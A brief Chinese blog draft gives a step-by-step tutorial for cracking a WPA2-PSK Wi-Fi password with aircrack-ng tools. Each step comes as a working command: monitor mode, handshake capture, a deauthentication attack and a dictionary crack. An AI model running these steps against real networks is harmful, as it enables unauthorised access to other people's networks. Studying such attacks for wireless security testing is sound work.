---
title: 'wifi密钥破解(WPA2-PSK)'
date: 2019-01-01
category: 'kali&Linux'
tags: []
lang: 'zh'
draft: true
---
## 0
这里本应该写一点关于WLAN协议的知识， 暂且略过

## 开启网卡监听模式

`airmon-ng start wlan0`
![开启监听模式](https://upload-images.jianshu.io/upload_images/10651191-59c3d0b886bef84a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

## 捕获空气中的数据包

`airodump-ng wlan0mon`
![捕获的数据](https://upload-images.jianshu.io/upload_images/10651191-4308ac2f15db0f04.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

下面一排是已经建立了连接的网络

## 指定想要破解的wifi， 开始抓包

`airodump-ng --bssid 20:54:FA:5E:52:F9 --channel 6 -w crackwifi wlan0mon`

![抓包](https://upload-images.jianshu.io/upload_images/10651191-ef2c7da6c759fed4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

这里我们看到由于我的电脑已经连接到了我手机的热点， 所以我们无法捕获到握手包

## 发送解除验证攻击

`aireplay-ng -0 5 -a 20:54:FA:5E:52:F9 --ignore-negative wlan0mon`

![解除验证](https://upload-images.jianshu.io/upload_images/10651191-c021a1858222fd4b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

这时候就可以看到握手包啦

![握手包](https://upload-images.jianshu.io/upload_images/10651191-27f0789417767095.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

## 开始破解
`aircrack-ng crackwifi-01.cap -w common.dic `

为了加快速度， 我把密码放到了很前面23333， 所以一下子就搞完了。
![破解ing](https://upload-images.jianshu.io/upload_images/10651191-0db2a049224eaab3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
